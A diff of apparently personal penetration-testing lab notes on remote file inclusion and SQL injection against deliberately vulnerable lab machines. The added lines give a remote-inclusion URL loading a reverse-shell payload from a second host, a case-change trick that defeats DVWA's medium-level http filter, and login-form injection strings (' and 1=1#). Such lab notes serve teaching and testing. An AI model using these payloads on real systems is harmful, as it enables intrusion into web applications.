@@ -129,7 +129,7 @@ This example uses the `/var/log/auth.log` file. If we are able to find, for exam
 
 ## Remote file inclusion
 
-This is where we can attach a server by read ANY file from ANY server!
+This is where we can attack a server by reading ANY file from ANY server!
 
 To ensure that this vulerability can be tested on our metasplotable machine we need to enable two php settings within that machine. You will need to go directly as a server admin first to that machine and set `allow_url_fopen` and `allow_url_include` to be both set to *On*. Note: both of these settings are found in the `/etc/php5/cgi/php.ini` file on the metasplotable sever.
 
@@ -153,16 +153,23 @@ To use this we first, as always, need to listen using netcat in a termial like s
 
 Then in the browser open the vulnerable fi page and set the `page` parameter to point to the location via http of the reverse.txt exploit file, like so `http://10.0.2.4/dvwa/vulnerabilities/fi/?page=http://10.0.2.15/reverse.txt?`
 
+Quick note: if you set the DVWA security level to medium the above will not work (because there is code to strip out 'http' & 'https' in the page parameter). However, a very simple workaround is to capitalize some part (for example like 'hTTp') - and it will work again! This is because the filters used (in medium security setting) are not case sensitive.
 
+## SQL Injection
 
+Firstly, login as a root user to the metasplotable mysql sever. This is done using the following command (this is not a hack, however, the mysql root account is not password protected on the metasplotable machine!): `mysql -u root -h 10.0.2.4`
 
+In Kali, open the Mutillidae application. Register an account and then login to check it works.
 
+Now logout and let's check the loging for to see if it is vulnerable! Enter your registered username first and in the password field just put a single quote ' and see what happens! What we see is a very informative error including the exact SQL that is executed. `SELECT * FROM accounts WHERE username='darren' AND password='''`
 
+Now lets change the password to this (assume the real password is 123456): `123456' and 1=1#`
 
+The single quote after the password essentially closes the password quote in the servers SQL statement. We can then append a 1=1 statement (which is true) and followed by a comment # to basically hide the trailing single quote that will be placed there by the server side SQL statement.
 
+What we should see is that we are still able to login. This is because we are firstly passing the correct password but also passing a 'true' sql statement (`1=1`) that is also evaluated. 
 
-
-
+Let's confirm that the SQL that we inject after the password *is* being evaluated by passing a false statement which should cause the login request to fail, like so: `123456' and 1=2#`
 
 
 
